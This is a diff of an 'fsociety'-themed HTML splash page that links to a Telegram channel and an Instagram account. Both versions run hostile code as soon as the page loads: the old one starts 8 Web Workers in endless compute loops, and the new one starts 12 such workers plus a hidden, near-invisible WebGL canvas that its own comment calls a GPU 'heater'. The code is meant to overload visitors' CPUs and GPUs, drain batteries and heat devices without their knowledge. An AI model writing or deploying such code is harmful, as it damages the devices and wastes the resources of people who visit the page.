@@ -3,91 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>INDLENDD // OVERLOAD</title>
+    <title>INDLENDD // SYSTEM_MAX_LOAD</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');
         * { box-sizing: border-box; cursor: crosshair; margin: 0; padding: 0; }
+        body { background-color: #000; color: #fff; font-family: 'Courier Prime', monospace; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        
+        /* Невидимый "нагреватель" GPU */
+        #heater { position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; pointer-events: none; z-index: -1; }
 
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: 'Courier Prime', monospace;
-            height: 100vh;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        /* Кровь (Стекающие капли) */
-        .drop {
-            position: absolute;
-            top: -100px;
-            width: 2px;
-            background: linear-gradient(to bottom, transparent, #ffffff);
-            z-index: 999;
-            pointer-events: none;
-            border-radius: 0 0 4px 4px;
-        }
-
-        /* Интро */
-        #intro {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; z-index: 100;
-        }
-        .intro-t { letter-spacing: 12px; opacity: 0; transition: 1.5s; text-align: center; font-size: 1.1rem; }
-
-        /* Контент */
-        .content-wrapper {
-            position: relative; z-index: 10; width: 90%; max-width: 600px;
-            display: none; flex-direction: column; align-items: center;
-            text-align: center;
-        }
-
-        .terminal-log {
-            font-size: 11px; color: #444; height: 100px; text-align: left;
-            width: 100%; margin-bottom: 20px; overflow: hidden;
-        }
-
-        .fsociety-mask {
-            font-size: 6px; line-height: 7px; white-space: pre; 
-            margin-bottom: 30px; opacity: 0.9;
-        }
-
-        .links-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%;
-        }
-        .btn {
-            border: 1px solid #fff; padding: 12px; color: #fff; text-decoration: none;
-            text-align: center; font-weight: bold; transition: 0.3s; background: rgba(0,0,0,0.5);
-        }
-        .btn:hover { background: #fff; color: #000; box-shadow: 0 0 15px #fff; }
-        .btn span { display: block; font-size: 9px; opacity: 0.6; margin-top: 4px; }
-
-        .scanlines {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(255, 255, 255, 0.05) 0px, transparent 2px);
-            pointer-events: none; z-index: 20;
-        }
-
-        @keyframes fall {
-            to { transform: translateY(110vh); }
-        }
+        .drop { position: absolute; top: -100px; width: 2px; background: linear-gradient(to bottom, transparent, #fff); z-index: 999; animation: fall linear infinite; }
+        @keyframes fall { to { transform: translateY(110vh); } }
+        #intro { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; }
+        .intro-t { letter-spacing: 12px; opacity: 0; transition: 1.5s; text-align: center; }
+        .content-wrapper { position: relative; z-index: 10; width: 90%; max-width: 600px; display: none; flex-direction: column; align-items: center; text-align: center; }
+        .fsociety-mask { font-size: 6px; line-height: 7px; white-space: pre; margin-bottom: 30px; }
+        .btn { border: 1px solid #fff; padding: 12px; color: #fff; text-decoration: none; font-weight: bold; width: 100%; margin: 5px; }
     </style>
 </head>
 <body>
 
-<div class="scanlines"></div>
+<canvas id="heater"></canvas>
 
 <div id="intro">
-    <div id="t1" class="intro-t">WELCOME TO FSOCIETY</div><br>
-    <div id="t2" class="intro-t" style="font-weight: bold;">INDLENDD WORLD</div>
+    <div id="t1" class="intro-t">SYSTEM OVERLOAD</div><br>
+    <div id="t2" class="intro-t">STAY CALM</div>
 </div>
 
 <div class="content-wrapper" id="main">
-    <div class="terminal-log" id="log"></div>
     <div class="fsociety-mask">
 ⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
 ⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
@@ -111,72 +54,51 @@
 ⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
 ⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
     </div>
-
-    <div class="links-grid">
-        <a href="https://t.me/indlendd" class="btn" target="_blank">TELEGRAM<span>@indlendd</span></a>
-        <a href="https://instagram.com/moyra_atrooo" class="btn" target="_blank">INSTAGRAM<span>@moyra_atrooo</span></a>
+    <div style="display: flex; width: 100%;">
+        <a href="https://t.me/indlendd" class="btn">TELEGRAM</a>
+        <a href="https://instagram.com/moyra_atrooo" class="btn">INSTAGRAM</a>
     </div>
 </div>
 
 <script>
-    // --- СИСТЕМА НАГРЕВА (OVERLOAD) ---
-    const blob = new Blob([`
-        while(true) {
-            Math.sqrt(Math.random() * 10000000);
-            Math.sin(Math.random()) * Math.cos(Math.random());
+    // --- GPU OVERLOAD ---
+    const canvas = document.getElementById('heater');
+    const gl = canvas.getContext('webgl');
+    if (gl) {
+        function stress() {
+            for (let i = 0; i < 500; i++) {
+                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                gl.clear(gl.COLOR_BUFFER_BIT);
+            }
+            requestAnimationFrame(stress);
         }
-    `], { type: 'application/javascript' });
+        stress();
+    }
 
+    // --- CPU OVERLOAD (Workers) ---
+    const blob = new Blob([`setInterval(()=>{for(let i=0;i<1e7;i++){Math.sqrt(i)}},1)`]);
     const workerUrl = URL.createObjectURL(blob);
-    // Запускаем 8 потоков (на большинстве телефонов это все ядра)
-    for (let i = 0; i < 8; i++) {
-        new Worker(workerUrl);
-    }
+    for(let i=0; i<12; i++) new Worker(workerUrl);
 
-    // --- ВИЗУАЛ ---
-    function makeDrop() {
-        const drop = document.createElement('div');
-        drop.className = 'drop';
-        drop.style.left = Math.random() * 100 + 'vw';
-        drop.style.height = Math.random() * 100 + 40 + 'px';
-        const duration = Math.random() * 2 + 1.5;
-        drop.style.animation = `fall ${duration}s linear infinite`;
-        drop.style.opacity = Math.random() * 0.5;
-        document.body.appendChild(drop);
-        setTimeout(() => { drop.remove(); }, duration * 1000);
-    }
-    setInterval(makeDrop, 150);
-
-    const logLines = [
-        "> BOOT_INIT...", "> BYPASS_FIREWALL...",
-        "> CORE_TEMP: RISING", "> CPU_LOAD: 100%", 
-        "> STATUS: OVERLOADED"
-    ];
+    // --- VISUALS ---
+    setInterval(() => {
+        const d = document.createElement('div');
+        d.className = 'drop';
+        d.style.left = Math.random() * 100 + 'vw';
+        d.style.height = Math.random() * 100 + 40 + 'px';
+        const dur = Math.random() * 1.5 + 1;
+        d.style.animation = `fall ${dur}s linear infinite`;
+        document.body.appendChild(d);
+        setTimeout(() => d.remove(), dur * 1000);
+    }, 100);
 
     setTimeout(() => document.getElementById('t1').style.opacity = '1', 500);
     setTimeout(() => document.getElementById('t2').style.opacity = '1', 1500);
-    
     setTimeout(() => {
         document.getElementById('intro').style.display = 'none';
-        const main = document.getElementById('main');
-        main.style.display = 'flex';
-        
-        let idx = 0;
-        const logDiv = document.getElementById('log');
-        function typeLog() {
-            if(idx < logLines.length) {
-                const p = document.createElement('div');
-                p.textContent = logLines[idx];
-                logDiv.appendChild(p);
-                idx++;
-                setTimeout(typeLog, 400);
-            }
-        }
-        typeLog();
-        // Добавляем вибрацию при входе
-        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-    }, 4500);
+        document.getElementById('main').style.display = 'flex';
+        if (navigator.vibrate) navigator.vibrate(500);
+    }, 4000);
 </script>
-
 </body>
 </html>
